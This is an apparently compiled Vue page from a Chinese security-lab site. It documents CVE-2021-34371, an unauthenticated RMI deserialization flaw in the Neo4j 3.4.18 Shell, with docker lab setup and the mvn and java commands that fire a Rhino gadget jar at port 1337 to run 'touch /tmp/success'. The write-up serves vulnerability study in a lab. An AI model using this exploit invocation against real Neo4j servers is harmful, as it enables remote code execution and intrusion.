import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as l,c as s,a as e,b as t,d as a,e as n}from"./app-58e4a7d6.js";const c={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),h=e("p",null,"Neo4j是一个开源图数据库管理系统。",-1),p=e("p",null,[t("在Neo4j 3.4.18及以前，如果开启了Neo4j Shell接口，攻击者将可以通过RMI协议以未授权的身份调用任意方法，其中"),e("code",null,"setSessionVariable"),t("方法存在反序列化漏洞。因为这个漏洞并非RMI反序列化，所以不受到Java版本的影响。")],-1),_=e("p",null,"在Neo4j 3.5及之后的版本，Neo4j Shell被Cyber Shell替代。",-1),u=e("p",null,"参考链接：",-1),m={href:"https://www.exploit-db.com/exploits/50170",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/mozilla/rhino/issues/520",target:"_blank",rel:"noopener noreferrer"},b=n(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>如果你使用Linux或OSX系统，可以执行如下命令启动一个Neo4j 3.4.18：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TARGET_IP=&lt;your-ip&gt; docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中，环境变量<code>TARGET_IP</code>需要制定靶场环境的IP地址。</p><p>如果你是Windows系统，请直接修改<code>docker-compose.yml</code>，指定<code>TARGET_IP</code>环境变量的值。</p><p>服务启动后，访问<code>http://your-ip:7474</code>即可查看到Web管理页面，但我们需要攻击的是其1337端口，这个端口是Neo4j Shell端口，使用RMI协议通信。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),f={href:"https://www.exploit-db.com/exploits/50170",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/vulhub/vulhub/blob/master/neo4j/CVE-2021-34371/rhino_gadget",target:"_blank",rel:"noopener noreferrer"},x=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ mvn install
$ cp target/rhino_gadget-1.0-SNAPSHOT-fatjar.jar ./
$ java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi://192.168.174.128:1337 &quot;touch /tmp/success&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262330323.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，<code>touch /tmp/success5</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262331632.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4);function j(N,S){const o=i("ExternalLinkIcon");return l(),s("div",null,[d,h,p,_,u,e("ul",null,[e("li",null,[e("a",m,[t("https://www.exploit-db.com/exploits/50170"),a(o)])]),e("li",null,[e("a",g,[t("https://github.com/mozilla/rhino/issues/520"),a(o)])])]),b,e("p",null,[t("使用"),e("a",f,[t("参考链接"),a(o)]),t("中的Java RMI客户端，集成基于Rhino的"),e("a",v,[t("Gadget"),a(o)]),t("，发送RMI请求：")]),x])}const I=r(c,[["render",j],["__file","Neo4j Shell Server 反序列化漏洞 CVE-2021-34371.html.vue"]]);export{I as default};
